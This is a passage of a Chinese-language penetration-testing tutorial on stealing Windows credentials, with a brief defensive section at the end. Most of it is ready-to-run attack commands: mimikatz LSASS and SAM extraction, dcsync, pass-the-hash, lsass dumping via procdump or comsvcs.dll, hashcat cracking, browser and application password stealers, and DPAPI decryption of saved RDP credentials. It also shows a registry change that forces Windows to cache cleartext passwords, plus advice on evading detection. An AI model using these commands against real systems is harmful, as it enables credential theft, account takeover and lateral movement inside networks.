接下来看几个常用的模块

### sekurlsa模块

```
privilege模块
privilege::debug 提升为debug权限
sekurlsa：模块，从lsass进程中提取passwords、keys、pin、tickets等信息
sekurlsa::msv 获取HASH (LM,NTLM)
sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码
sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码
sekurlsa::tspkg 通过tspkg读取明文密码
sekurlsa::livessp 通过livessp 读取明文密码
sekurlsa::ssp 通过ssp 读取明文密码
sekurlsa::logonPasswords 通过以上各种方法读取明文密码

sekurlsa::process 将自己的进程切换到lsass进程中，之前只是注入读取信息
sekurlsa::minidump file 这个模块可以读取已经打包的内存信息
sekurlsa::pth 哈希传递
sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx
sekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx
```

```
在cs上简单的使用:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```



### process模块

```
process::list 列出进程列表
process::exports 导出进程列表
process::imports 导入列表
process::start 开始一个进程
process::stop 停止一个程序
process::suspend 冻结一个进程
process::resume 从冻结中恢复
process::run notepad 运行一个程序
process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口
```

### kerberos模块

```
kerberos::list 列出系统中的票据
kerberos::tgt 清除系统中的票据
kerberos::purge 导入票据到系统中
kerberos::ptc 票据路径
```

### lsadump模块

```
在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
lsadump::dcsync /domain:kevin.com /user:root
(在域控上执行)读取所有域用户的哈希
lsadump::lsa /patch
从sam.hive和system.hive文件中获得NTLM Hash
lsadump::sam /sam:sam.hive /system:system.hive
从本地SAM文件中读取密码哈希
token::elevate
lsadump::sam
```

## SAM文件抓取密码

### 导出sam和system文件 

1、通多reg命令无工具导出

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

![image-20230202174141247](https://image.201068.xyz/assets/image-20230202174141247.png)

2、通过nishang中的Copy-VSS进行复制，如果这个脚本运行在了 DC服务器上，ntds.dit 和 SYSTEM hive也能被拷 贝出来

```
copy‐vss //直接将文件保存在当前目录下
copy‐vss ‐DestinationDir 路径 //指定保存文件的路径（必须是已经存在的路径）
```

![image-20230202174217687](https://image.201068.xyz/assets/image-20230202174217687.png)

### 读取sam和system文件获取密码

```
lsadump::sam /sam:sam.hive /system:system.hive
```

![d](https://image.201068.xyz/assets/image-20230202174254715.png)

# Mimikatz在线读取sam和lsass获取密码

## 在线读取sam文件

使用mimikatz在线读取sam文件

```
分开的命令如下
privilege::debug
token:elevate
lsadump::sam
连起来
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```

![image-20230202174340707](https://image.201068.xyz/assets/image-20230202174340707.png)

## 在线读取lsass进程

从lsass进程中提取passwords、keys、pin、tickets等信息

```
privilege::debug
sekurlsa::msv 获取HASH (LM,NTLM)
sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码
sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码
sekurlsa::tspkg 通过tspkg读取明文密码
sekurlsa::livessp 通过livessp 读取明文密码
sekurlsa::ssp 通过ssp 读取明文密码
sekurlsa::logonPasswords 通过以上各种方法读取明文密码
```

![image-20230202174421922](https://image.201068.xyz/assets/image-20230202174421922.png)

# Mimikatz离线读取lsass进程抓取密码

## 导出lsass文件方式

### 1、使用任务管理器导出（windows NT 6）

![image-20230202174536572](https://image.201068.xyz/assets/image-20230202174536572.png)

### 2、使用procdump 导出lsass.dmp文件

ProcDump 是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows任务管 理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入 的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉

```
procdump.exe ‐accepteula ‐ma lsass.exe lsass.dmp
```

![image-20230202174610054](https://image.201068.xyz/assets/image-20230202174610054.png)

### 3、使用PowerSploit 的Out-MiniDump模块

PowerSploit是一个基于 Powershell 的渗透工具包，可以选择创建 进程的完整内存转储。

地址 https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

```
import-Module .\Out-Minidump.ps1    (powershell-improt .\Out-Minidump.ps1)
Get-Process lsass | Out-Minidump
```

![image-20230202174630386](https://image.201068.xyz/assets/image-20230202174630386.png)

### 4、comsvcs.dll，系统自带。

通过comsvcs.dll的导出函数MiniDump实现dump内存

首先查看lsass.exe进程PID: `tasklist | findstr lsass.exe` 

使用powershell导出 `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 488 C:\lsass.dmp full`

![image-20230202174658233](https://image.201068.xyz/assets/image-20230202174658233.png)

## 读取lsass.dmp文件

使用mimikatz读取lsass.dmp文件

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
```

![image-20230202174749633](https://image.201068.xyz/assets/image-20230202174749633.png)

https://blog.csdn.net/weixin_42136837/article/details/112616369

# 使用Hashcat和在线工具破解NTLM Hash

## Hashcat介绍

Hashcat是一个密码恢复工具。直到2015年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于 Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt 格式，以及 MySQL 和 Cisco PIX 中使用的算法。 

下载地址： https://hashcat.net/hashcat/ 

Hashcat的官网是Hashcat.net ,点击进去后会有两个下载选项，我们选择hashcat binaries，这个是直接可以在 Windows下运行的

![image-20230202174907443](https://image.201068.xyz/assets/image-20230202174907443.png)

## 使用hashcat破解NTLM Hash

```
hashcat ‐m 1000 NTLM HASH字典 ‐‐force
```

![image-20230202174942850](https://image.201068.xyz/assets/image-20230202174942850.png)

## 网站破解

https://www.cmd5.com/

# 浏览器、数据库等其他密码的抓取

## BrowserGhost浏览器抓取

这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下： 

- 实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集) 
- 用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘) 
- 可以解密chrome全版本密码(chrome80版本后加密方式变了) 
- Chrome已经可以获取login data、cookie、history、book了 
- 命令：`BrowserGhost.exe`

![image-20230202175259790](https://image.201068.xyz/assets/image-20230202175259790.png)

## Sharp-HackBrowserData浏览器

- Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi等常见的浏览器都能抓 
- 命令：`Sharp-HackBrowserData.exe`

![image-20230202175353365](https://image.201068.xyz/assets/image-20230202175353365.png)

![image-20230202175401977](https://image.201068.xyz/assets/image-20230202175401977.png)

## SharpDecryptPwd数据库

- SharpDecryptPwd-master对密码已保存在 Windwos 系统上的部分程序进行解析,包 
- Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品

```
SharpDecryptPwd.exe -NavicatCrypto
SharpDecryptPwd.exe -TeamViewer
SharpDecryptPwd.exe -FileZilla
SharpDecryptPwd.exe -WinSCP
SharpDecryptPwd.exe -Xmangager -p Session_Path (-s UserSid)
SharpDecryptPwd.exe -Browser
```

![image-20230202175453606](https://image.201068.xyz/assets/image-20230202175453606.png)

## LaZagne各类密码

- 是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算 法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。 
- 命令：`laZagne.exe all`

```
laZagne.exe all
laZagne.exe browsers
laZagne.exe browsers ‐firefox
laZagne.exe all ‐oN
laZagne.exe all ‐oA ‐output C:\Users\test\Desktop
laZagne.exe ‐h
laZagne.exe browsers ‐h
laZagne.exe all ‐vv
laZagne.exe all ‐quiet ‐oA
```



![image-20230202175540985](https://image.201068.xyz/assets/image-20230202175540985-16753317422881.png)



# Windows其他类型抓取NTLM HASH工具

## getpassword

打开GetPass工具所在的目录。打开命令行环境。运行64位程`GetPassword`。运行该程序后,即可获得明文密码

![image-20230202175947353](https://image.201068.xyz/assets/image-20230202175947353.png)

## pwdump7

在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash

![image-20230202180010430](https://image.201068.xyz/assets/image-20230202180010430.png)

## QuarksPwDump

下载QuarksPwDump.exe,在命令行环境中输人 `QuarksPwDump.exe --dump-hash-local` 导出三个用户的NLMHash

![image-20230202180041280](https://image.201068.xyz/assets/image-20230202180041280.png)

## nishang

nishang中的 GET-PASSHashes.ps1可以可以获取hash

```
Import‐Module .\Get‐PassHashes.ps1
Get‐PassHashes
```

![image-20230202180119702](https://image.201068.xyz/assets/image-20230202180119702.png)

## wce

这款工具是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash。这款工具也分为32位和 64位两个不同的版本：

```
‐l 列出登录的会话和NTLM凭据（默认值）
‐s 修改当前登录会话的NTLM凭据 参数：<用户名>:<域名>:<LM哈希>:<NT哈希>
‐r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次
‐c 用一个特殊的NTML凭据运行一个新的会话 参数：
‐e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次
‐o 保存所有的输出到一个文件 参数:<文件名>
‐i 指定一个LUID代替使用当前登录会话 参数:
‐d 从登录会话中删除NTLM凭据 参数:
‐a 使用地址 参数: <地址>
‐f 强制使用安全模式
‐g 生成LM和NT的哈希 参数<密码>
‐K 缓存kerberos票据到一个文件（unix和windows wce格式）
‐k 从一个文件中读取kerberos票据并插入到windows缓存中
‐w 通过摘要式认证缓存一个明文的密码
‐v 详细输出
```

![image-20230202180156060](https://image.201068.xyz/assets/image-20230202180156060.png)

![image-20230202180411948](https://image.201068.xyz/assets/image-20230202180411948.png)

# Windows RDP凭证的抓取和密码破解

## 破解原理

Credentials的解密是Windows系统信息收集中非常重要的一环，其中包括各类敏感、重要的凭证（这个可以理解 为密码），接下来我们就讲解RDP凭证的抓取和破解 ,RDP(远程桌面)。

在我们点击保存密码后，Windows就通过MasterKey将我们的密码加密后保存在本地，由于Windows还需要解密 从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到MasterKey就能将密码解出来。

![image-20230202180515275](https://image.201068.xyz/assets/image-20230202180515275.png)

## 凭证的查看

查看凭证命令 

```
查看mstsc的连接记录
cmdkey /list
查找本地的Credentials
dir /a %userprofile%\appdata\local\microsoft\credentials\*
```

![image-20230202180554709](https://image.201068.xyz/assets/image-20230202180554709.png)

![image-20230202180603540](https://image.201068.xyz/assets/image-20230202180603540.png)

## 在线破解

1、使用mimikatz获取该文件的MasterKey的guid

```
mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\FF22A1FDA68FD8515B52C534E8655421
```

所以用于加密凭据文件FF22A1FDA68FD8515B52C534E8655421B的MasterKey的guid就是：{c271c658-e61b4023-95d2-dfbf18b0aa33}，所以我们只要从内存中找到这个guid对应的MasterKey的值即可

![image-20230202180650004](https://image.201068.xyz/assets/image-20230202180650004.png)

2、找到内存中对应的MasterKey

```
mimikatz sekurlsa::dpapi
```

![image-20230202180713961](https://image.201068.xyz/assets/image-20230202180713961.png)

3、最后打开mimikatz通过MasterKey值去解密凭据文件

```
dpapi::cred /in:凭据文件路径 /masterky:masterkey值
```

```
mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c
```

![image-20230202180745467](https://image.201068.xyz/assets/image-20230202180745467.png)

## 离线破解

由于我们不能保证我们的mimikatz是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目 的其实很简单，就是把目标的文件和内存下载回来，在vps或本机上进行mimikatz解密即可。

 1、下载目标内存

```
procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump #导出lsass
```

![image-20230202180835043](https://image.201068.xyz/assets/image-20230202180835043.png)

2、下载目标的Credentials文件

![image-20230202180915140](https://image.201068.xyz/assets/image-20230202180915140.png)

3、用mimikatz载入dump回来的内存

```
Sekurlsa::minidump lsass1.dump
```

![image-20230202180935850](https://image.201068.xyz/assets/image-20230202180935850.png)

4、获取Credentials的GUID

```
dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421
```

![image-20230202180958678](https://image.201068.xyz/assets/image-20230202180958678.png)

5、获取内存中所有的MasterKey

```
sekurlsa::dpapi
```

![image-20230202194358750](https://image.201068.xyz/assets/image-20230202194358750.png)

6、利用MasterKey解密

```
dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c
```

![image-20230202194436859](https://image.201068.xyz/assets/image-20230202194436859.png)

# Windows-2012R2之后抓取密码的方式

在Windows2012系统及以上的系统，默认在*内存缓存中 禁止 保存明文密码*的。攻击者可以通过 *修改注册表* 的方式 抓取明文，需要用户*重新登录后*才能成功抓取

![image-20230203154647667](https://image.201068.xyz/assets/image-20230203154647667.png)



## 修改注册表和锁屏

### 修改注册表

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f #开启
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f #关闭
```

![image-20230203154722396](https://image.201068.xyz/assets/image-20230203154722396.png)

### 锁屏

```
rundll32.exe user32.dll,LockWorkStation #锁屏

query user #查询登录
logoff ID号 #下线
```

![image-20230203154749135](https://image.201068.xyz/assets/image-20230203154749135.png)

## 抓取密码

![image-20230203154808635](https://image.201068.xyz/assets/image-20230203154808635.png)

# 密码防范

## 2012R2域控设置

在windows server 2012 R2中，新增了一个*Protected Users* 安全组，将用户加入到该私有组，用户的明文密码就不会 被获取

![image-20230203154854263](https://image.201068.xyz/assets/image-20230203154854263.png)

## 安装KB2871997

2014年，Microsoft发布了*KB2871997补丁*，它主要包括了Windows 8.1和Windows Server 2012 R2中增强的安 全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012 也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止”哈希传递“的攻击方式，但其确实有助于是Windows 免受一些常见的攻击，例如：明文密码脱取、RDP凭据盗取、盗取本地Administrator账户进行横向移动。

## 修改注册表

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭
```



